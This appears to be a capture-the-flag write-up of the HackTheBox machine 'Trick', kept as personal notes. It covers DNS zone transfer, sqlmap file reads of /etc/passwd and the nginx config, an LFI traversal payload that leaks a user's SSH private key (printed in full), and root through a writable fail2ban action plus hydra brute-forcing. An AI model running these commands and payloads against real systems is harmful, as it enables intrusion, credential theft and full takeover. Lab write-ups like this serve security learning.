
as always starting with nmap
`sudo nmap -sC -sV -T4 -oN nmap_trick -p- 10.10.11.166`
![[Pasted image 20240619124022.png]]


we got 4 open ports , the 80 hosting a static web page without any interesting functionalities , we can't really do anything with ==SMTP== other than enumerating users .
let's enumerate ==DNS== 

using ==nslookup== we got a domain
![[Pasted image 20240619124718.png]]

I will add it to the ==/etc/hosts== and use it to get more infos from the ==DNS==
using DNS zone transfer we got a new domain 
`dig axfr trick.htb  @10.10.11.166`
![[Pasted image 20240619125242.png]]

looks like a CMS , quick google show us that there's potential ==sqli==
![[Pasted image 20240619125707.png]]

https://www.exploit-db.com/exploits/50802 , the public exploit didn't work , I will use ==sqlmap==

![[Pasted image 20240619130050.png]]

==sqli== confirmed
`sqlmap -r sqltest.txt --dump`
![[Pasted image 20240619130144.png]]

the informations we got from the sqli until now , are not helpful , I tried to get shell but that didn't work , so let's try to read files
`sqlmap -r sqltest.txt --file-read "/etc/passwd"`
![[Pasted image 20240619130532.png]]
we can read files 
![[Pasted image 20240619130623.png]]

try different files but nothing useful , let's try to read the ==nginx== files
` sqlmap -r sqltest.txt --file-read "/etc/nginx/sites-available/default"
`
new vhosts
![[Pasted image 20240619131428.png]]

let's add it to the ==/etc/hosts== 
![[Pasted image 20240619131650.png]]

a potential ==lfi== 
![[Pasted image 20240619131712.png]]

after testing different payloads , we got this 
`...//....//....//....//....//....//....//....//....//etc/passwd
![[Pasted image 20240619131900.png]]

`....//....//....//....//....//....//....//....//....///home/michael/.ssh/id_rsa`

`-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+ 4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/ Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4 1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0 +93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6 IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/ KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0 fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS 3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+ IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ== 
`-----END OPENSSH PRIVATE KEY-----`


PE
`sudo -l`
we can restart the ==fail2ban service== , let's check the configuration files of the service
![[Pasted image 20240619132806.png]]

we have write access over this folder 
![[Pasted image 20240619133027.png]]

 I found this blog and I followed it to get root
 https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7

I will add a malicious code in the ==iptables-multiport.conf== file
![[Pasted image 20240619133547.png]]

and I will restart the ==fail2ban servcie== and bruteforce the ssh to trigger ==the action ban==
` sudo /etc/init.d/fail2ban restart`
![[Pasted image 20240619134109.png]]

` hydra -l idk -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt ssh://10.10.11.166
`
once I will get banned , I will get root 
![[Pasted image 20240619135009.png]]


![[Pasted image 20240619135036.png]]